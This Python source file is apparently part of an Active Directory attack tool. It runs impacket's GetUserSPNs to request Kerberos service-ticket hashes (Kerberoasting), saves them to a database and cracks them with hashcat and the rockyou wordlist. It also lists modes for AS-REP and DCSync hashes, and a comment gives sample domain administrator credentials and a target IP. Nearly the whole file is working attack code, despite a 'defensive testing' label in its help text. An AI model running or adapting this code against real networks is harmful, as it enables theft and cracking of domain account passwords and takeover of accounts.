import argparse
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
import shutil
import subprocess
import tempfile
from typing import Sequence

from ..db.database import upsert_user_hash
# run_kerberoast('gikyon.local', 'Administrator', 'Admin@123', '192.168.80.132')
# app/utils/
def check_kerberoast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['impacket-GetUserSPNs', '-dc-ip', target_ip, creds],
        capture_output=True,
        text=True
    )

    result_withbanner = output.stdout.splitlines()
    result = result_withbanner[4:]
    formatted = []
    for line in result:
        information = line.split()
        if len(information) > 3:
            formatted.append(f"{information[1]} - {information[0]}")
    return formatted


def run_kerberoast(domain, username, password, target_ip):
    creds = f"{domain}/{username}:{password}"

    output = subprocess.run(
        ['impacket-GetUserSPNs', '-dc-ip', target_ip, creds, '-request'],
        capture_output=True,
        text=True
    )

    result = []

    for line in output.stdout.splitlines():
        if "$krb5tgs$" in line:
            parsed = _parse_kerberoast_hash(line)
            if parsed:
                timestamp = datetime.now(timezone.utc).isoformat()
                upsert_user_hash(parsed["username"], "kerberosHash", parsed["hash"], timestamp)
                parsed["timestamp"] = timestamp
                result.append(parsed)
            else:
                result.append({
                    "username": "Unknown",
                    "hash": line,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                })

    return result


def _parse_kerberoast_hash(hash_line):
    parts = hash_line.split("$")
    if len(parts) < 5:
        return None

    user_part = parts[3]
    if not user_part.startswith("*"):
        return None

    username = user_part.lstrip("*")
    if not username:
        return None

    return {"username": username, "hash": hash_line}


HASHCAT_MODE = "13100"
DEFAULT_HASH_FILE = Path("hash.txt")
DEFAULT_WORDLIST = Path("/usr/share/wordlists/rockyou.txt")
FALLBACK_WORDLIST = Path(__file__).resolve().parent / "users"
HASHCAT_MODES = {
    "kerberoast": "13100",
    "asrep": "18200",
    "dcsync": "1000",
}


class HashcatRunnerError(RuntimeError):
    pass


@dataclass(frozen=True)
class HashcatResult:
    command: list[str]
    returncode: int
    stdout: str
    stderr: str
    cracked: list[str]


def resolve_wordlist(wordlist: Path) -> Path:
    if wordlist.is_file():
        return wordlist

    if wordlist == DEFAULT_WORDLIST and FALLBACK_WORDLIST.is_file():
        return FALLBACK_WORDLIST

    compressed = Path(f"{wordlist}.gz")
    if compressed.is_file():
        raise HashcatRunnerError(
            f"wordlist is compressed: {compressed}. "
            f"Decompress it first, for example: sudo gzip -dk {compressed}"
        )

    raise HashcatRunnerError(f"wordlist not found: {wordlist}")


def validate_inputs(hash_file: Path, wordlist: Path) -> tuple[Path, Path]:
    """Validate local files and return normalized paths."""
    if shutil.which("hashcat") is None:
        raise HashcatRunnerError("hashcat is not installed or not on PATH")

    if not hash_file.is_file():
        raise HashcatRunnerError(f"hash file not found: {hash_file}")

    return hash_file, resolve_wordlist(wordlist)


def run_command(command: Sequence[str], timeout_seconds: int | None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        list(command),
        capture_output=True,
        check=False,
        text=True,
        timeout=timeout_seconds,
    )


def crack_hash_file(
    hash_file: str | Path,
    mode: str,
    wordlist: str | Path = DEFAULT_WORDLIST,
    *,
    timeout_seconds: int | None = None,
    extra_hashcat_args: Sequence[str] | None = None,
) -> HashcatResult:
    """Run `hashcat -m <mode>` and return stdout, stderr, return code, and cracked lines."""
    hash_path, wordlist_path = validate_inputs(Path(hash_file), Path(wordlist))
    extra_args = list(extra_hashcat_args or [])

    command = [
        "hashcat",
        "-m",
        mode,
        str(hash_path),
        str(wordlist_path),
        *extra_args,
    ]

    crack_process = run_command(command, timeout_seconds)

    show_command = [
        "hashcat",
        "-m",
        mode,
        str(hash_path),
        "--show",
    ]
    show_process = run_command(show_command, timeout_seconds)
    cracked = [
        line
        for line in show_process.stdout.splitlines()
        if line.strip()
    ]

    return HashcatResult(
        command=command,
        returncode=crack_process.returncode,
        stdout=crack_process.stdout,
        stderr=crack_process.stderr,
        cracked=cracked,
    )


def crack_hash_value(
    hash_value: str,
    hash_type: str,
    wordlist: str | Path = DEFAULT_WORDLIST,
    *,
    timeout_seconds: int | None = None,
    extra_hashcat_args: Sequence[str] | None = None,
) -> HashcatResult:
    if hash_type not in HASHCAT_MODES:
        raise HashcatRunnerError(f"Unsupported hash type: {hash_type}")

    mode = HASHCAT_MODES[hash_type]
    with tempfile.TemporaryDirectory() as temp_dir:
        hash_path = Path(temp_dir) / "hash.txt"
        hash_path.write_text(f"{hash_value}\n", encoding="utf-8")
        return crack_hash_file(
            hash_path,
            mode,
            wordlist,
            timeout_seconds=timeout_seconds,
            extra_hashcat_args=extra_hashcat_args,
        )


def crack_kerberos_tgs_hashes(
    hash_file: str | Path = DEFAULT_HASH_FILE,
    wordlist: str | Path = DEFAULT_WORDLIST,
    *,
    timeout_seconds: int | None = None,
    extra_hashcat_args: Sequence[str] | None = None,
) -> HashcatResult:
    """
    Run `hashcat -m 13100` and return stdout, stderr, return code, and cracked lines.

    `extra_hashcat_args` lets an application pass controlled options such as
    ["--status", "--status-timer", "30"] without rebuilding this wrapper.
    """
    return crack_hash_file(
        hash_file,
        HASHCAT_MODE,
        wordlist,
        timeout_seconds=timeout_seconds,
        extra_hashcat_args=extra_hashcat_args,
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Run Hashcat mode 13100 against a hash file for defensive testing."
    )
    parser.add_argument(
        "hash_file",
        nargs="?",
        default=str(DEFAULT_HASH_FILE),
        help="Path to the hash file. Defaults to ./hash.txt.",
    )
    parser.add_argument(
        "wordlist",
        nargs="?",
        default=str(DEFAULT_WORDLIST),
        help="Path to the wordlist. Defaults to /usr/share/wordlists/rockyou.txt.",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=None,
        help="Optional timeout in seconds for each hashcat command.",
    )
    parser.add_argument(
        "--hashcat-arg",
        action="append",
        default=[],
        help="Extra hashcat argument. Repeat for multiple arguments.",
    )
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    try:
        result = crack_kerberos_tgs_hashes(
            args.hash_file,
            args.wordlist,
            timeout_seconds=args.timeout,
            extra_hashcat_args=args.hashcat_arg,
        )
    except (HashcatRunnerError, subprocess.TimeoutExpired) as exc:
        print(f"Error: {exc}")
        return 2

    print("Command:")
    print(" ".join(result.command))
    print()

    if result.stdout.strip():
        print(result.stdout.rstrip())

    if result.stderr.strip():
        print(result.stderr.rstrip())

    print()
    print("Recovered hashes:")
    if result.cracked:
        for line in result.cracked:
            print(line)
    else:
        print("None recovered.")

    return result.returncode


if __name__ == "__main__":
    raise SystemExit(main())